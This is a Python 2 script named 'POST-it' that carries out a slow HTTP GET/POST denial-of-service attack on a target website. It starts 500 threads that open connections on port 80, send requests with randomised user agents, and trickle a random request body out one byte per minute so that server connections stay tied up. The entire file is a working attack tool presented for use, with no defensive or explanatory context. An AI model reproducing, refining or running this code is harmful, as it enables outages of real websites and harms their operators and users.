#!/usr/bin/python
# Fuck it, added better random junk...
# Fuck it, added RandomUserAgent...
# Fuck it, added list of random useragents...

import os
import sys
import socket
import time
import getopt
import re
from threading import Thread
import random

ualist = []

def load_useragents():
    if os.path.isfile('./ualist.txt'):
        for f in open('./ualist.txt', 'r'):
            ualist.append(f)

load_useragents()
            
userAgent = random.choice(ualist)

class MyThread(Thread,):
    def __init__(self,SITE, DOS_TYPE):
        Thread.__init__(self)
        self.method = DOS_TYPE
        self.site = SITE
        self.kill_received = False
    def run(self):
        while not self.kill_received:
            server = socket.gethostbyname(self.site)
            post = os.urandom(6000)
            file = 'index.php'

            request = '%s /%s HTTP/1.1\r\n' %(self.method.upper(),file)
            request += 'Host: %s\r\n' % (self.site)
            request += 'User-Agent: ' + userAgent
            request += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
            request += 'Accept-Language: en-us,en;q=0.5\r\n'
            request += 'Accept-Encoding: gzip,deflate\r\n'
            request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
            request += 'Keep-Alive: 900\r\n'
            request += 'Connection: keep-alive\r\n'
            request += 'Content-Type: application/x-www-form-urlencoded\r\n'
            request += 'Content-length: %s\r\n\r\n' % (len(post))

            newrequest = '%s\r\n' % (post)
            newrequest += '\r\n'

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                s.connect((server, 80))
                s.send(request)

                for c in newrequest:
                    sys.stdout.write( s.send(c).__str__() )
                    time.sleep(60)
                s.close()
                #s.recv(50000)
            except:
                print "Is It Dead Yet?"

def da_delegator(SITE,DOS_TYPE):
    thread_count = 500
    print '=' * 60
    print 'POST-it v1.5.0 by x41 [at] insecurety.net'.center(60,'-')
    print '=' * 60
    threads = []
    for num in range(thread_count):
        thr1=MyThread(SITE,DOS_TYPE)
        print 'start - %s' % thr1
        thr1.start()
        threads.append(thr1)
        #thr1.join()

    while len(threads) > 0:
            try:
                # Join all threads using a timeout so it doesn't block
                # Filter out threads which have been joined or are None
                threads = [t.join(1) for t in threads if t is not
None and t.isAlive()]
            except KeyboardInterrupt:
                print "Ctrl-c received! Sending kill to threads... COCKS! It didnt work! Just Kill The Terminal" # Need to fix this!!!
                for t in threads:
                    t.kill_received = True
                    sys.exit(2)

def main(argv):
    def usage():
        print '=' * 60
        print 'POST-it v1.5.0 by x41 [at] insecurety.net'.center(60,'-')
        print '=' * 60
        print 'For get DOS - USAGE: postit.py -t get http://example.com'
        print 'For post DOS - USAGE: postit.py -t post http://example.com'
        sys.exit(2)
    if not argv:
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:h", ["help",
"type"])
    except getopt.GetoptError, err:
        print str(err)
        sys.exit(2)
    output = None
    verbose = False
    SITE = re.sub(r'http://', '', str(sys.argv[-1:][0]))

    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-t", "--type"):
            if a.lower() == 'post':
                DOS_TYPE = 'POST'
                da_delegator(SITE,DOS_TYPE)
            elif a.lower() =='get':
                DOS_TYPE = 'get'
                da_delegator(SITE,DOS_TYPE)
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        else:
            assert False, "unhandled option"

if __name__=="__main__":
    main(sys.argv[1:])

